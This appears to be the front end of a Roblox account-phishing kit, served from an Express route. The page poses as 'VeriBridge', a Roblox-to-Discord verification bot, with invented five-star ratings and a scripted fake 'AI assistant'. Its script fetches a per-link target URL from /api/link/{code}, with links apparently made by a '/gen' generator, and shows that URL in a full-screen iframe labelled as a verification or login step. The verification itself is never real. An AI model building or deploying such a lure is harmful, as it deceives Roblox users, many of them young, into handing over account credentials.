        @media(min-width:768px){.brand-main{font-size:4rem}}
        .veri-white{color:#ffffff}
        .bridge-purple{background:linear-gradient(135deg,#c084fc,#a855f7,#7c3aed);background-clip:text;-webkit-background-clip:text;color:transparent}
        .brand-subtitle{font-size:1.2rem;font-weight:600;margin-top:0.1rem}
        @media(min-width:768px){.brand-subtitle{font-size:1.5rem}}
        .bringing-white{color:#ffffff}
        .roblox-red{color:#ff4d4d}
        .to-white{color:#ffffff}
        .discord-blue{color:#5865F2}
        .description-text{font-size:0.85rem;color:#9ab3cc;max-width:600px;margin:0.8rem auto 0;line-height:1.5}
        .username-row{display:flex;flex-direction:row;align-items:center;justify-content:center;gap:10px;max-width:550px;margin:1rem auto;flex-wrap:wrap}
        .username-input{flex:2;min-width:200px;background:rgba(0,0,0,0.5);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:0.9rem 1.2rem;font-size:0.95rem;color:#ffffff;outline:none}
        .username-input:focus{border-color:#8dd0ff;box-shadow:0 0 0 3px rgba(100,200,255,0.2)}
        .get-started-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:0.9rem 1.8rem;border-radius:60px;font-weight:700;font-size:0.95rem;color:white;cursor:pointer;transition:all 0.2s}
        .error-msg{color:#ff5555;font-size:0.7rem;text-align:center;margin-top:0.3rem;display:none}
        .error-msg.show{display:block}
        .legal-note{font-size:0.65rem;color:#7e95b5;text-align:center;margin-top:0.5rem}
        .rating-stars{color:#ffc107;font-size:0.8rem;text-align:center;margin-top:0.8rem}
        .features-section{margin:3rem 0 2rem}
        .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:1.8rem}
        .feature-card{background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);border-radius:1.2rem;padding:1.5rem;border:1px solid rgba(100,200,255,0.2)}
        .feature-card h3{font-size:1.2rem;font-weight:600;color:#cceeff;margin-bottom:0.8rem}
        .feature-card p{color:#9ab3cc;font-size:0.85rem;line-height:1.5}
        .section-title{font-size:1.6rem;font-weight:700;text-align:center;margin-bottom:2rem;background:linear-gradient(135deg,#ffffff,#8dd0ff);background-clip:text;-webkit-background-clip:text;color:transparent}
        .dashboard-gold{display:flex;flex-direction:column;gap:1rem;margin-top:2rem}
        @media(min-width:900px){.dashboard-gold{display:grid;grid-template-columns:300px 1fr;gap:1.5rem}}
        .verification-sidebar-gold{background:rgba(0,0,0,0.45);backdrop-filter:blur(16px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}
        .sidebar-gold-header{background:linear-gradient(115deg,rgba(100,200,255,0.2),rgba(100,200,255,0.1));padding:1rem;text-align:center;border-bottom:2px solid rgba(100,200,255,0.6)}
        .sidebar-gold-header h2{font-size:1rem;color:#8dd0ff}
        .verify-options-gold{padding:0.8rem}
        .verify-card-gold{background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);border-radius:1rem;padding:0.8rem;margin-bottom:0.8rem;cursor:pointer;border:1px solid rgba(100,200,255,0.3)}
        .verify-card-gold.active{background:linear-gradient(145deg,rgba(100,200,255,0.25),rgba(100,200,255,0.15));border-color:#8dd0ff;box-shadow:0 4px 20px rgba(100,200,255,0.3)}
        .method-letter-circle{width:42px;height:42px;border-radius:50%;background:rgba(100,200,255,0.15);border:1.5px solid #8dd0ff;display:flex;align-items:center;justify-content:center;margin-bottom:0.5rem}
        .method-letter{font-size:1.2rem;font-weight:700;color:#8dd0ff}
        .card-title-gold{font-weight:700;color:#cceeff;margin-bottom:0.2rem;font-size:0.9rem}
        .card-desc-gold{font-size:0.65rem;color:#9ab3cc}
        .verify-badge-gold{display:inline-block;margin-top:6px;font-size:0.55rem;background:rgba(0,0,0,0.6);padding:2px 8px;border-radius:20px;color:#8dd0ff}
        .login-viewer-gold{background:rgba(0,0,0,0.4);backdrop-filter:blur(20px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}
        .viewer-header-gold{background:rgba(0,0,0,0.5);padding:0.8rem 1rem;border-bottom:1px solid rgba(100,200,255,0.5);display:flex;flex-direction:column;align-items:center;gap:10px}
        @media(min-width:600px){.viewer-header-gold{flex-direction:row;justify-content:space-between}}
        .method-indicator-gold{display:flex;align-items:center;gap:10px}
        .method-indicator-circle{width:28px;height:28px;border-radius:50%;background:rgba(100,200,255,0.2);border:1px solid #8dd0ff;display:flex;align-items:center;justify-content:center}
        .method-indicator-letter{font-size:0.9rem;font-weight:700;color:#8dd0ff}
        .method-name-gold{color:#cceeff;font-weight:600;font-size:0.9rem}
        .status-chip-gold{background:rgba(0,0,0,0.6);padding:4px 10px;border-radius:40px;font-size:0.65rem;color:#8dd0ff}
        .roblox-auth-section{padding:1.5rem;background:rgba(0,0,0,0.3);border-radius:1rem;margin:1rem}
        .auth-input-group{display:flex;gap:10px;flex-wrap:wrap;flex-direction:column}
        .roblox-username-input{width:100%;background:rgba(0,0,0,0.6);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:12px 20px;color:#ffffff;font-size:0.9rem;outline:none}
        .verify-roblox-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 24px;border-radius:60px;font-weight:bold;color:white;cursor:pointer;margin-top:10px}
        .user-profile-preview{display:none;align-items:center;gap:15px;padding:15px;background:rgba(0,0,0,0.5);border-radius:1rem;margin-top:15px}
        .user-profile-preview.show{display:flex}
        .preview-avatar{width:60px;height:60px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
        .preview-info h4{color:#ffffff;font-size:1rem}
        .redirect-container{padding:1rem 1.5rem 1.5rem;text-align:center}
        .welcome-text{color:#ffffff;font-size:1rem;margin-bottom:0.5rem}
        .redirect-desc{color:#cceeff;font-size:0.85rem;margin-bottom:0.5rem}
        .bottom-start-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 28px;border-radius:60px;font-weight:bold;font-size:1rem;color:white;cursor:pointer;margin-top:1rem}
        .bottom-start-btn:disabled{opacity:0.5;cursor:not-allowed}
        .footer-gold{text-align:center;margin-top:2rem;font-size:0.6rem;color:#9ab3cc}
        .fullscreen-loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;opacity:0;visibility:hidden}
        .fullscreen-loading.active{opacity:1;visibility:visible}
        .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}
        @keyframes spinGold{to{transform:rotate(360deg)}}
        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
        .frame-overlay.active{visibility:visible;opacity:1}
        .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}
        .frame-overlay.active .frame-card{transform:scale(1)}
        .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}
        .frame-close:hover{background:#e34d4d}
        .roblox-login-iframe{width:100%;height:560px;border:none;display:block}
        @media(max-width:550px){.roblox-login-iframe{height:520px}}
        .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}
        .user-profile-card.show{display:flex}
        .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
        .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}
        .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}
        .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}
        .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
        .chat-bubble span{font-size:28px}
        .chat-window{position:fixed;bottom:80px;right:15px;width:340px;height:500px;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(100,200,255,0.5);display:none;flex-direction:column;overflow:hidden;z-index:1001}
        .chat-window.active{display:flex}
        .chat-header{background:linear-gradient(135deg,rgba(100,200,255,0.3),rgba(100,200,255,0.1));padding:12px 16px;display:flex;justify-content:space-between;align-items:center}
        .chat-header h4{color:#8dd0ff;font-size:1rem}
        .close-chat{background:none;border:none;color:#8dd0ff;font-size:1.3rem;cursor:pointer}
        .chat-messages{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:10px}
        .message{display:flex;margin-bottom:5px}
        .message.ai{justify-content:flex-start}
        .message.user{justify-content:flex-end}
        .message-bubble{max-width:80%;padding:8px 14px;border-radius:18px;font-size:0.8rem}
        .message.ai .message-bubble{background:rgba(100,200,255,0.15);color:#cceeff;border:1px solid rgba(100,200,255,0.3)}
        .message.user .message-bubble{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);color:white}
        .chat-input-area{display:flex;gap:10px;padding:12px;border-top:1px solid rgba(100,200,255,0.3)}
        .chat-input{flex:1;background:rgba(255,255,255,0.1);border:1px solid rgba(100,200,255,0.4);border-radius:40px;padding:10px 15px;color:white;outline:none}
        .send-btn{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border:none;border-radius:40px;padding:8px 18px;font-weight:bold;cursor:pointer;color:white}
        .typing-indicator{display:flex;gap:4px;padding:8px 14px;background:rgba(100,200,255,0.1);border-radius:18px;width:fit-content}
        .typing-indicator span{width:6px;height:6px;background:#8dd0ff;border-radius:50%;animation:typing 1.4s infinite}
        @keyframes typing{0%,60%,100%{transform:translateY(0);opacity:0.4}30%{transform:translateY(-8px);opacity:1}}
    </style>
</head>
<body>
<div class="frost-overlay"></div>

<div id="startLoadingOverlay" class="fullscreen-loading"><div class="loading-spinner-large"></div><div class="loading-text-glow">VERIBRIDGE</div><div class="loading-sub">Loading verification methods...</div></div>

<div id="userProfileCard" class="user-profile-card">
    <img id="userAvatar" class="user-avatar" src="">
    <span id="userDisplayName" class="user-display-name"></span>
    <button id="logoutBtnHeader" class="logout-btn">X</button>
</div>

<!-- LANDING PAGE -->
<div id="startScreen" class="premium-container">
    <div class="golden-header">
        <div class="premium-logo-gold">
            <img class="brand-logo" id="siteLogo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
            <span class="gold-badge">ROBLOX VERIFICATION</span>
        </div>
    </div>
    
    <div class="brand-container">
        <div class="brand-main">
            <span class="veri-white">Veri</span><span class="bridge-purple">Bridge</span>
        </div>
        <div class="brand-subtitle">
            <span class="bringing-white">Bringing</span>
            <span class="roblox-red"> Roblox </span>
            <span class="to-white">to</span>
            <span class="discord-blue"> Discord</span>
        </div>
        <div class="description-text">Connect Roblox to Discord using VeriBridge, the leading Roblox Discord Bot. Verify who you really are, sync your group to your server, and more.</div>
    </div>
    
    <div class="username-row">
        <input type="text" id="landingUsername" class="username-input" placeholder="Enter your Roblox username">
        <button id="landingVerifyBtn" class="get-started-btn">Get Started</button>
    </div>
    <div id="landingErrorMsg" class="error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div>
    <div class="legal-note">By continuing, you agree to our terms of service and privacy policy.</div>
    <div class="rating-stars">★★★★★ <span>Top rated Roblox bot by thousands of users</span></div>
    
    <div class="features-section"><div class="section-title">Why choose veribridge?</div><div class="features-grid">
        <div class="feature-card"><h3>No complex setup or documentation needed</h3><p>veribridge appeals to the average user and the advanced user.</p></div>
        <div class="feature-card"><h3>Simple Verification</h3><p>Verify through our Roblox game or by a code on your profile.</p></div>
        <div class="feature-card"><h3>Bonds</h3><p>Connect gamepasses, badges, group ranks to Discord roles.</p></div>
        <div class="feature-card"><h3>Roblox-based Server Restrictions</h3><p>Lock your server with age-limits and group-only restrictions.</p></div>
        <div class="feature-card"><h3>Group Utility Commands</h3><p>Manage Roblox groups directly from Discord.</p></div>
        <div class="feature-card"><h3>User Utility Commands</h3><p>Look up Roblox users from Discord.</p></div>
    </div></div>
    <div class="footer-gold">veribridge — Seamless Roblox verification for modern communities</div>
</div>

<!-- DASHBOARD -->
<div id="mainDashboard" class="premium-container" style="display:none">
    <div class="golden-header">
        <div class="premium-logo-gold">
            <img class="brand-logo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
            <span class="gold-badge">ROBLOX VERIFICATION</span>
        </div>
    </div>
    <div class="dashboard-gold">
        <div class="verification-sidebar-gold"><div class="sidebar-gold-header"><h2>VERIFICATION METHODS</h2></div>
        <div class="verify-options-gold">
            <div class="verify-card-gold" data-method="login" id="methodLoginGold"><div class="method-letter-circle"><span class="method-letter">A</span></div><div class="card-title-gold">Authorize Roblox</div><div class="card-desc-gold">Link your Roblox account with Veribridge</div><div class="verify-badge-gold" id="loginStatusGold">Not verified</div></div>
            <div class="verify-card-gold" data-method="ingame" id="methodIngameGold"><div class="method-letter-circle"><span class="method-letter">I</span></div><div class="card-title-gold">Verify via In-Game</div><div class="card-desc-gold">Roblox In-Game Auth</div><div class="verify-badge-gold" id="ingameStatusGold">Not verified</div></div>
            <div class="verify-card-gold" data-method="community" id="methodCommunityGold"><div class="method-letter-circle"><span class="method-letter">C</span></div><div class="card-title-gold">Verify via Community</div><div class="card-desc-gold">Roblox Group/Community</div><div class="verify-badge-gold" id="communityStatusGold">Not verified</div></div>
        </div></div>
        <div class="login-viewer-gold"><div class="viewer-header-gold"><div class="method-indicator-gold"><div class="method-indicator-circle"><span class="method-indicator-letter" id="activeMethodLetter">A</span></div><span class="method-name-gold" id="activeMethodNameGold">Authorize Roblox</span></div><span class="status-chip-gold" id="verificationStatusGold">Not verified</span></div>
        <div class="roblox-auth-section"><div class="auth-input-group"><div class="input-wrapper"><input type="text" id="robloxUsernameInput" class="roblox-username-input" placeholder="Enter your Roblox username..."><div id="dashErrorMsg" class="dash-error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div></div><button id="verifyRobloxBtn" class="verify-roblox-btn">Continue with Username</button></div>
        <div id="userProfilePreview" class="user-profile-preview"><img id="previewAvatar" class="preview-avatar"><div class="preview-info"><h4 id="previewUsername"></h4><p>Roblox account linked</p></div></div></div>
        <div class="redirect-container"><div class="welcome-text" id="redirectTitle">Select a verification method</div><div class="redirect-desc" id="redirectDesc">Choose one of the methods from the sidebar to continue</div><button id="bottomStartVerifyBtn" class="bottom-start-btn" disabled>Start Verification</button></div></div>
    </div>
    <div class="footer-gold">Select a verification method to continue</div>
</div>

<!-- IFRAME OVERLAY -->
<div id="robloxFrameOverlay" class="frame-overlay">
    <div class="frame-card">
        <button class="frame-close" id="closeFrameBtn">✕</button>
        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
    </div>
</div>

<!-- AI CHAT -->
<div class="ai-chat-widget" id="chatWidget"><div class="chat-bubble"><span>🤖</span></div></div>
<div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>

<script>
let TARGET_URL = 'https://www.roblox.com';

const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');

if (code) {
    fetch(`/api/link/${code}`)
        .then(res => res.json())
        .then(data => {
            if (data.success && data.targetUrl) {
                TARGET_URL = data.targetUrl;
                console.log('[VeriBridge] Loaded target URL:', TARGET_URL);
                document.getElementById('startLoadingOverlay').classList.remove('active');
            } else {
                document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red"><h1>❌ Link Not Found</h1><p>This verification link does not exist.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
            }
        })
        .catch(err => {
            console.error('Error loading link:', err);
            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red"><h1>❌ Connection Error</h1><p>Cannot connect to server.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
        });
} else {
    document.getElementById('startLoadingOverlay').classList.remove('active');
}

// AI CHAT SYSTEM
const chatWidget=document.getElementById('chatWidget'),chatWindow=document.getElementById('chatWindow'),closeChatBtn=document.getElementById('closeChatBtn'),chatInput=document.getElementById('chatInput'),sendChatBtn=document.getElementById('sendChatBtn'),chatMessages=document.getElementById('chatMessages');
let isTyping=false;

function addMessage(text,isUser=false){
    const div=document.createElement('div');
    div.className=`message ${isUser?'user':'ai'}`;
    div.innerHTML=`<div class="message-bubble">${text}</div>`;
    chatMessages.appendChild(div);
    chatMessages.scrollTop=chatMessages.scrollHeight;
}

function showTypingIndicator(){
    const typingDiv=document.createElement('div');
    typingDiv.className='message ai typing-indicator-container';
    typingDiv.id='typingIndicator';
    typingDiv.innerHTML=`<div class="typing-indicator"><span></span><span></span><span></span></div>`;
    chatMessages.appendChild(typingDiv);
}

function removeTypingIndicator(){
    const indicator=document.getElementById('typingIndicator');
    if(indicator)indicator.remove();
}

function getAIResponse(question){
    const q=question.toLowerCase();
    if(q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
    if(q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
    if(q.includes('hello')) return "Hello! Welcome to VeriBridge.";
    return "I can help with Roblox verification, Discord integration, and group commands!";
}

async function sendMessage(){
    const text=chatInput.value.trim();
    if(!text||isTyping)return;
    addMessage(text,true);
    chatInput.value='';
    showTypingIndicator();
    isTyping=true;
    await new Promise(resolve=>setTimeout(resolve,600));
    const response=getAIResponse(text);
    removeTypingIndicator();
    addMessage(response,false);
    isTyping=false;
}

chatWidget.addEventListener('click',()=>chatWindow.classList.toggle('active'));
closeChatBtn.addEventListener('click',()=>chatWindow.classList.remove('active'));
sendChatBtn.addEventListener('click',sendMessage);
chatInput.addEventListener('keypress',e=>{if(e.key==='Enter')sendMessage()});

// Frame logic
const frameOverlay=document.getElementById('robloxFrameOverlay');
const closeFrameBtn=document.getElementById('closeFrameBtn');
const robloxIframe=document.getElementById('robloxLoginIframe');

function showRobloxFlow(){
    console.log('[VeriBridge] Loading URL in iframe:', TARGET_URL);
    robloxIframe.src = TARGET_URL;
    frameOverlay.classList.add('active');
}

function hideFrame(){
    frameOverlay.classList.remove('active');
    setTimeout(() => {
        if (!frameOverlay.classList.contains('active')) {
            robloxIframe.src = 'about:blank';
        }
    }, 300);
}

closeFrameBtn?.addEventListener('click', hideFrame);
frameOverlay?.addEventListener('click', (e)=>{
    if(e.target === frameOverlay) hideFrame();
});

// Dashboard logic
function isValidUsername(e){return/^[a-zA-Z0-9_]{3,20}$/.test(e)}

let currentRobloxUser=null;
let verificationState={login:{completed:!1},ingame:{completed:!1},community:{completed:!1}};
let currentActiveMethod="login";

const methodLogin=document.getElementById('methodLoginGold'),methodIngame=document.getElementById('methodIngameGold'),methodCommunity=document.getElementById('methodCommunityGold');
const loginBadge=document.getElementById('loginStatusGold'),ingameBadge=document.getElementById('ingameStatusGold'),communityBadge=document.getElementById('communityStatusGold');
const activeMethodLetter=document.getElementById('activeMethodLetter'),activeMethodName=document.getElementById('activeMethodNameGold');
const verificationStatusChip=document.getElementById('verificationStatusGold'),bottomStartBtn=document.getElementById('bottomStartVerifyBtn');
const verifyRobloxBtn=document.getElementById('verifyRobloxBtn'),robloxUsernameInput=document.getElementById('robloxUsernameInput');
const userProfilePreview=document.getElementById('userProfilePreview'),previewAvatar=document.getElementById('previewAvatar'),previewUsername=document.getElementById('previewUsername');
const redirectTitle=document.getElementById('redirectTitle'),redirectDesc=document.getElementById('redirectDesc'),dashErrorMsg=document.getElementById('dashErrorMsg');
const userProfileCard=document.getElementById('userProfileCard'),userAvatar=document.getElementById('userAvatar'),userDisplayName=document.getElementById('userDisplayName'),logoutBtnHeader=document.getElementById('logoutBtnHeader');

function updateUserCard(){
    if(currentRobloxUser){
        userAvatar.src=currentRobloxUser.avatarUrl;
        userDisplayName.textContent=currentRobloxUser.username;
        userProfileCard.classList.add('show');
        bottomStartBtn.disabled=false;
    } else {
        userProfileCard.classList.remove('show');
        bottomStartBtn.disabled=true;
    }
}

function updateUI(){
    methodLogin.classList.toggle('active', currentActiveMethod==='login');
    methodIngame.classList.toggle('active', currentActiveMethod==='ingame');
    methodCommunity.classList.toggle('active', currentActiveMethod==='community');
    const letters={login:'A',ingame:'I',community:'C'}, names={login:'Authorize Roblox',ingame:'Verify via In-Game',community:'Verify via Community'};
    activeMethodLetter.innerHTML=letters[currentActiveMethod];
    activeMethodName.innerHTML=names[currentActiveMethod];
    verificationStatusChip.innerHTML=verificationState[currentActiveMethod].completed?'Verified':'Not verified';
    loginBadge.innerHTML=verificationState.login.completed?'Verified':'Not verified';
    ingameBadge.innerHTML=verificationState.ingame.completed?'Verified':'Not verified';
    communityBadge.innerHTML=verificationState.community.completed?'Verified':'Not verified';
}

function setActiveMethod(method){currentActiveMethod=method;updateUI();}
function onMethodClick(){
    if(!currentRobloxUser){
        addMessage("Please enter your Roblox username first!", false);
        return;
    }
    showRobloxFlow();
}

function verifyDashUser(){
    const username=robloxUsernameInput.value.trim();
    if(!username || !isValidUsername(username)){
        dashErrorMsg.classList.add('show');
        robloxUsernameInput.classList.add('error');
        addMessage("Invalid Roblox username.", false);
        return;
    }
    dashErrorMsg.classList.remove('show');
    const avatarUrl=`https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${username.charAt(0).toUpperCase()}`;
    currentRobloxUser={id:username, username:username, avatarUrl:avatarUrl};
    localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
    previewAvatar.src=avatarUrl;
    previewUsername.textContent=username;
    userProfilePreview.classList.add('show');
    updateUserCard();
    addMessage(`Welcome ${username}! Select a verification method.`, false);
    redirectTitle.innerHTML=`Welcome ${username}`;
    redirectDesc.innerHTML='Choose a method from the sidebar';
}

function logoutUser(){
    currentRobloxUser=null;
    localStorage.removeItem('veribridge_user');
    userProfilePreview.classList.remove('show');
    updateUserCard();
    robloxUsernameInput.value='';
    redirectTitle.innerHTML='Select a verification method';
    redirectDesc.innerHTML='Choose a method from the sidebar';
    addMessage("Logged out.", false);
}

const savedUser=localStorage.getItem('veribridge_user');
if(savedUser){
    try{
        currentRobloxUser=JSON.parse(savedUser);
        if(currentRobloxUser){
            previewAvatar.src=`https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${currentRobloxUser.username.charAt(0).toUpperCase()}`;
            previewUsername.textContent=currentRobloxUser.username;
            userProfilePreview.classList.add('show');
            updateUserCard();
            redirectTitle.innerHTML=`Welcome ${currentRobloxUser.username}`;
            robloxUsernameInput.value=currentRobloxUser.username;
        }
    }catch(e){}
}

verifyRobloxBtn.addEventListener('click', verifyDashUser);
methodLogin.addEventListener('click',()=>setActiveMethod('login'));
methodIngame.addEventListener('click',()=>setActiveMethod('ingame'));
methodCommunity.addEventListener('click',()=>setActiveMethod('community'));
bottomStartBtn.addEventListener('click', onMethodClick);
logoutBtnHeader.addEventListener('click', logoutUser);

// Landing screen
const landingBtn=document.getElementById('landingVerifyBtn'), landingUsername=document.getElementById('landingUsername');
const startScreenDiv=document.getElementById('startScreen'), mainDashboardDiv=document.getElementById('mainDashboard');
const startLoading=document.getElementById('startLoadingOverlay'), landingErrorMsg=document.getElementById('landingErrorMsg');

landingBtn.addEventListener('click',()=>{
    const username=landingUsername.value.trim();
    if(!username || !isValidUsername(username)){
        landingErrorMsg.classList.add('show');
        landingUsername.classList.add('error');
        return;
    }
    landingErrorMsg.classList.remove('show');
    startLoading.classList.add('active');
    setTimeout(()=>{
        const avatarUrl=`https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${username.charAt(0).toUpperCase()}`;
        currentRobloxUser={id:username, username:username, avatarUrl:avatarUrl};
        localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
        previewAvatar.src=avatarUrl;
        previewUsername.textContent=username;
        userProfilePreview.classList.add('show');
        updateUserCard();
        redirectTitle.innerHTML=`Welcome ${username}`;
        robloxUsernameInput.value=username;
        startLoading.classList.remove('active');
        startScreenDiv.style.display='none';
        mainDashboardDiv.style.display='block';
        addMessage(`Welcome ${username}! Select a verification method.`, false);
        updateUI();
    }, 1500);
});
updateUI();
</script>
</body>
</html>
    `);
});

module.exports = app;
